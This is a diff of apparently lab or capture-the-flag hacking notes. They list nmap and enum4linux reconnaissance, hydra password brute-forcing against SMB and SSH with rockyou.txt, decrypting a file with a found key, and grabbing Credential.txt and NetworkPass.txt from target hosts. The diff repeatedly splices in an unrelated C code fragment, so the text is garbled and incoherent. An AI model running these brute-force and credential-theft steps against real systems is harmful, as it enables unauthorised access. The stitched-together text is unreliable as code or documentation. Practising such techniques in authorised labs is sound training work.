@@ -1,13 +1,38 @@
+  /* Must be done before we do any password lookups */
+#if defined(HAVE_GETPRPWNAM) && defined(HAVE_SET_AUTH_PARAMETERS)
+    (void) set_auth_parameters(argc, argv);
+# ifdef HAVE_INITPRIVS
+    initprivs();
+# endif
+#endif /* HAVE_GETPRPWNAM && HAVE_SET_AUTH_PARAMETERS */
+
+
 
 # nmap -sV --script dns-service-discovery 192.168.173.138
 OR 
 enum4linux -a 192.168.173.138
 
+  /* Must be done before we do any password lookups */
+#if defined(HAVE_GETPRPWNAM) && defined(HAVE_SET_AUTH_PARAMETERS)
+    (void) set_auth_parameters(argc, argv);
+# ifdef HAVE_INITPRIVS
+    initprivs();
+# endif
+#endif /* HAVE_GETPRPWNAM && HAVE_SET_AUTH_PARAMETERS */
 
 # nmap -sV --script banner 192.168.174.0/24
 
 
-nmap -p 139,445 --script smb-enum-shares,smb-enum-users 192.168.0.0/24
+  /* Must be done before we do any password lookups */
+#if defined(HAVE_GETPRPWNAM) && defined(HAVE_SET_AUTH_PARAMETERS)
+    (void) set_auth_parameters(argc, argv);
+# ifdef HAVE_INITPRIVS
+    initprivs();
+# endif
+#endif /* HAVE_GETPRPWNAM && HAVE_SET_AUTH_PARAMETERS */
+
+
+# nmap -p 139,445 --script smb-enum-shares,smb-enum-users 192.168.0.0/24
 Crack password
 hydra -l henry -P /usr/share/wordlists/rockyou.txt smb://192.168.0.5
 access smb folder
@@ -18,13 +43,27 @@ then decode it
 you can copy the content to a new file and decode that file
 openssl enc -aes-256-cbc -d -salt -base64 -in encrypted.txt -k pass1Henry
 
-
+  /* Must be done before we do any password lookups */
+#if defined(HAVE_GETPRPWNAM) && defined(HAVE_SET_AUTH_PARAMETERS)
+    (void) set_auth_parameters(argc, argv);
+# ifdef HAVE_INITPRIVS
+    initprivs();
+# endif
+#endif /* HAVE_GETPRPWNAM && HAVE_SET_AUTH_PARAMETERS */
 
 # nmap -sV -p- --script vuln 192.168.0.0/24
 Then if you get it the IP you can start bruteforce the password and username
 # hydra -L simpleusernames.txt -P rockyou.txt ssh://192.168.174.140 -t 4
 Once you have a password, use it to gain access to the machine and find the file 
 # find / -name NetworkPass.txt 2>/dev/null
+
+  /* Must be done before we do any password lookups */
+#if defined(HAVE_GETPRPWNAM) && defined(HAVE_SET_AUTH_PARAMETERS)
+    (void) set_auth_parameters(argc, argv);
+# ifdef HAVE_INITPRIVS
+    initprivs();
+# endif
+#endif /* HAVE_GETPRPWNAM && HAVE_SET_AUTH_PARAMETERS */
 
 
 # nmap -p 21 -sV 192.168.0.0/24
@@ -34,6 +73,14 @@ Once you have a password, use it to gain access to the machine and find the file
 # ftp 192.168.174.139
 # ls
 # get Credential.txt
+
+  /* Must be done before we do any password lookups */
+#if defined(HAVE_GETPRPWNAM) && defined(HAVE_SET_AUTH_PARAMETERS)
+    (void) set_auth_parameters(argc, argv);
+# ifdef HAVE_INITPRIVS
+    initprivs();
+# endif
+#endif /* HAVE_GETPRPWNAM && HAVE_SET_AUTH_PARAMETERS */
 
 
 Ssh to the machine and enumerate all users by cat passwd file. Check all users
